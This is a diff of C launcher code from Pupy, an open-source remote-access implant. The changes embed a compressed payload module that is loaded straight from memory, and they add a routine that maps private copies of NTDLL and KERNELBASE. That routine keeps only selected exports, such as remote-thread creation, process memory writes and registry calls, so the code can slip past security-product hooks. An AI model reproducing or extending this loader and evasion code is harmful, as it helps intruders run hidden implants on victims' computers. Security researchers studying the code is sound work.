@@ -11,8 +11,15 @@
 
 #include "Python-dynload.c"
 
-extern DL_EXPORT(void) init_memimporter(void);
-extern DL_EXPORT(void) init_pupy(void);
+#ifdef _PUPY_DYNLOAD
+#ifdef DEBUG
+#include "_pupy_debug_pyd.c"
+#define _pupy_pyd_c_start _pupy_debug_pyd_c_start
+#define _pupy_pyd_c_size _pupy_debug_pyd_c_size
+#else
+#include "_pupy_pyd.c"
+#endif
+#endif
 
 typedef LPWSTR* (*CommandLineToArgvW_t)(
     LPCWSTR lpCmdLine,
@@ -22,6 +29,7 @@ typedef LPWSTR* (*CommandLineToArgvW_t)(
 
 #ifdef DEBUG
 // Redirect early stdout to some file
+static
 void redirect_stdout() {
     FILE* new_log;
     char tmpdir[MAX_PATH];
@@ -47,6 +55,7 @@ void redirect_stdout() {
 
 
 // https://stackoverflow.com/questions/291424/
+static
 LPSTR* CommandLineToArgvA(INT *pNumArgs)
 {
     LPWSTR cmdline;
@@ -150,21 +159,84 @@ LPSTR* CommandLineToArgvA(INT *pNumArgs)
     return result;
 }
 
-DWORD WINAPI mainThread(LPVOID lpArg)
-{
+#ifdef _PUPY_PRIVATE_NT
+typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
+
+static const PSTR NtDllAllowedPrefixes[] = {
+    "Nt", "RtlAdjust", "RtlAllocate", "RtlConnect",
+    NULL
+};
+static const PSTR Kernel32AllowedPrefixes[] = {
+    "Open", "CreateRemote", "CreateFile",
+    "Write", "Read", "Terminate", "Resume", "Virtual",
+    "Reg", NULL
+};
+#endif
+
+void initialize(BOOL isDll, on_exit_session_t *cb) {
     int i, argc = 0;
     char **argv = NULL;
+
+#ifdef _PUPY_DYNLOAD
+    _pupy_pyd_args_t args;
+#endif
+
+#ifdef _PUPY_PRIVATE_NT
+    HMODULE hNtDll = GetModuleHandleA("NTDLL.DLL");
+    HMODULE hKernelBase = GetModuleHandleA("KERNELBASE.DLL");
+    HMODULE hKernel32 = GetModuleHandleA("KERNEL32.DLL");
+
+#ifdef WIN_X64
+    BOOL blIsWow64 = FALSE;
+#else
+    BOOL blIsWow64 = TRUE;
+    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(
+        hKernel32, "IsWow64Process");
+
+    if (fnIsWow64Process)
+        fnIsWow64Process(GetCurrentProcess(),&blIsWow64);
+#endif
+
+    if (!blIsWow64 && hNtDll && hKernel32 && hKernelBase)  {
+        HMODULE hPrivate;
+        dprint("Loading private copy of NTDLL/KERNELBASE\n");
+
+        hPrivate = MyLoadLibraryEx(
+            "NTDLL.DLL", hNtDll, NULL, NtDllAllowedPrefixes,
+            MEMORY_LOAD_FROM_HMODULE | MEMORY_LOAD_EXPORT_FILTER_PREFIX
+        );
+
+        if (hPrivate) {
+            dprint(
+                "Private copy of NTDLL.DLL loaded to %p (orig: %p)\n",
+                hPrivate, hNtDll
+            );
+
+            hPrivate = MyLoadLibraryEx(
+                "KERNEL32.DLL", hKernelBase, hKernel32,
+                Kernel32AllowedPrefixes,
+                MEMORY_LOAD_FROM_HMODULE | MEMORY_LOAD_ALIASED | \
+                    MEMORY_LOAD_EXPORT_FILTER_PREFIX | \
+                    MEMORY_LOAD_NO_EP
+            );
+
+            if (hPrivate) {
+                dprint(
+                    "Private copy of KERNELBASE.DLL loaded to %p as KERNEL32 (orig: %p)\n",
+                    hPrivate, hKernel32
+                );
+            } else {
+                dprint("PRIVATE LOAD OF KERNEL32 FAILED\n");
+            }
+        }
+    }
+#endif
 
     dprint("TEMPLATE REV: %s\n", GIT_REVISION_HEAD);
 
 #ifdef DEBUG
     redirect_stdout();
 #endif
-
-    dprint("Initializing python...\n");
-    if (!initialize_python()) {
-        return -1;
-    }
 
     dprint("Parsing command line..\n");
     argv = CommandLineToArgvA(&argc);
@@ -173,11 +245,55 @@ DWORD WINAPI mainThread(LPVOID lpArg)
         dprint("ARGV: %d: %s\n", i, argv[i]);
     }
 
+    dprint("Initializing python...\n");
+    if (!initialize_python(argc, argv, isDll)) {
+        return;
+    }
+
+#ifdef _PUPY_DYNLOAD
+    dprint("_pupy built with dynload\n");
+
+    args.pvMemoryLibraries = MyGetLibraries();
+    args.cbExit = NULL;
+    args.blInitialized = FALSE;
+
+    dprint("Load _pupy\n");
+    xz_dynload(
+        "_pupy.pyd",
+        _pupy_pyd_c_start, _pupy_pyd_c_size,
+        &args
+    );
+
+    if (args.blInitialized != TRUE) {
+        dprint("_pupy.pyd initialization failed\n");
+        return;
+    }
+
+    dprint("cbExit: %p\n", args.cbExit);
+    dprint("pvMemoryLibraries: %p\n", args.pvMemoryLibraries);
+
+    if (cb) {
+        *cb = args.cbExit;
+    }
+#else
+    init_pupy();
+    if (cb) {
+        *cb = on_exit_session;
+    }
+#endif
+
+    return;
+}
+
+void deinitialize() {
+    deinitialize_python();
+}
+
+DWORD WINAPI execute(LPVOID lpArg)
+{
     // no lpArg means shared object
-    dprint("Running pupy... (args=%d argv=%p)\n", argc, argv);
-    run_pupy(argc, argv, lpArg);
-
+    dprint("Running pupy...\n");
+    run_pupy();
     dprint("Global Exit\n");
-
     return 0;
 }
